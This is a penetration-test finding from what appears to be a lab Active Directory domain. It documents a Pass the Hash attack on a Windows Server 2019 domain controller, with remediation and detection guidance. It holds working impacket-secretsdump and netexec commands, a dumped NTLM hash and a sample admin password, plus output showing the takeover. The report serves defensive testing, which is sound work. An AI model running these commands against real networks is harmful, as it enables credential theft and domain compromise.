# Pass the Hash: Hijacking Domain Administrator Account without a Password

| Field | Details |
|-------|---------|
| **Severity** | 🔴 Critical |
| **Technique** | Pass the Hash (PtH) |
| **Target** | `192.168.120.100` — `DC01-WINDOWSSERVER2019` |
| **Domain** | `lab.local` |
| **Prerequisite** | [Kerberoasting Finding](Kerberoasting.md) |
| **Prerequisite** | Known Breach Credentials (`lab.local\gsnake`) |

---

## Description

The Administrator account of the Windows 2019 Server was revealed during a Kerberoast attack. The password for `Administrator` was cracked with Hashcat, and access was gained through the Administrator account. After, impacket suite's SecretsDump is used to dump the NTLM hashes of the system and perform a Pass the Hash attack.

---

## Evidence

Chrystal Burris was identified as a Domain Administrator account during a previous [Kerberoasting](kerberoasting.md) enumeration. Her NT hash was recovered using impacket suite's SecretsDump and used to authenticate to her account without any knowledge of her plaintext password.

```
lab.local\CHRYSTAL_BURRIS:1150:aad3b435b51404eeaad3b435b51404ee:5c519514ffe21c74ce07ecb268a4ed14:::
```

**Commands used:**

```bash
# Dump NTLM hashes from DC using cracked Administrator credentials
impacket-secretsdump lab.local/Administrator:'Password123!'@192.168.120.100 > SecretsDump.txt

# Authenticate as CHRYSTAL_BURRIS using NT hash — no plaintext password required
netexec smb 192.168.120.100 -u 'CHRYSTAL_BURRIS' -H '5c519514ffe21c74ce07ecb268a4ed14'
```

> Full authentication output available in [Appendix A](#appendix-a)

---

## Impact

Being able to take over and use a Domain Administrator's account is extremely critical. Full access is given to the domain as an Administrator, which can achieve several malicious goals: read, write, and exfil all shared files in the domain, create new accounts for persistence on the system, and modify and disable security controls on the system.  This will work to access any machine where CHRYSTAL_BURRIS credentials are cached.

---

## Remediation

> Remediations are not listed in any specific order of severity unless otherwise noted.

1. **Disable NTLM Authentication wherever feasible** in favour of enforcing Kerberos. This will directly reduce the Pass the Hash attack surface.

2. **Enable Protected Users security group.** Members cannot authenticate through NTLM at all.

3. **Implement LAPS (Local Administrator Password Solution)** which will give every machine a unique and randomized local admin password, eliminating the lateral movement use case entirely.

4. **Tiered Administration Model** in which Domain Administrators never log in to workstations, which eliminates hashes getting cached on lower-tier machines.

5. **Utilize Credential Guard** — a Windows feature that protects credentials in memory using virtualization. This makes hash extraction exceptionally more difficult.

6. **Ensure SIEM and EDR are monitoring** for suspicious NTLM authentications such as accounts authenticating through NT hashes rather than passwords, or authenticating from anomalous source hosts.

---

## Detection

1. **Event ID 4624 Logon Type 3** will reveal network logins with an NT hash instead of valid credentials.  Look for `NtlmSsp` in the authentication package field.

2. **Event ID 4776** shows NTLM credential validation on the DC.  Review for timed authentication anomalies and unusual source hosts.

3. EDR tools like Defender for Identity will flag Pass the Hash directly via anomalous lateral movement patterns.

4. Users authenticating from unknown source IP's rather than their common workstations would be caught by a User & Entity Behavior Analysis (UEBA) solution.

---

## Appendix A

<details>
<summary>NetExec PtH Authentication Output</summary>

```
netexec smb 192.168.120.100 -u 'CHRYSTAL_BURRIS' -H '5c519514ffe21c74ce07ecb268a4ed14'

SMB  192.168.120.100  445  DC01-WINDOWSSER  [*] Windows 10 / Server 2019 Build 17763 x64
     (name:DC01-WINDOWSSER) (domain:lab.local) (signing:True) (SMBv1:None) (Null Auth:True)

SMB  192.168.120.100  445  DC01-WINDOWSSER  [+] lab.local\CHRYSTAL_BURRIS:5c519514ffe21c74ce07ecb268a4ed14 (Pwn3d!)
```

</details>
